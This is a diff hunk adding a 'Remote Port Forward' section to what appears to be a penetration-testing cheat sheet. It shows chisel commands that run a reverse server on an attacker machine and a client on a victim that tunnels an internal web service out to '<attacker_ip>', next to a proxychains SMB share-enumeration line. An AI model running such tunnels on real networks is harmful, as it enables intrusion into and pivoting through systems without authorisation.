@@ -104,6 +104,22 @@ proxychains nxc smb 172.16.119.10 -d DOMAIN -u user -p 'password' --shares
 
 ---
 
+### Remote Port Forward (Single Port)
+
+Forward a specific internal service back to attacker:
+
+```bash
+# Server on attacker
+./chisel server --reverse
+
+# Client on victim — forward internal web server to attacker port 9999
+./chisel client <attacker_ip>:8080 R:0.0.0.0:9999:<internal_ip>:80
+```
+
+Binds on attacker's 0.0.0.0:9999 so you can browse `http://localhost:9999` to hit the internal service.
+
+---
+
 ### Simple Port Forward / Reverse Port Forward
 
 #### Attack box
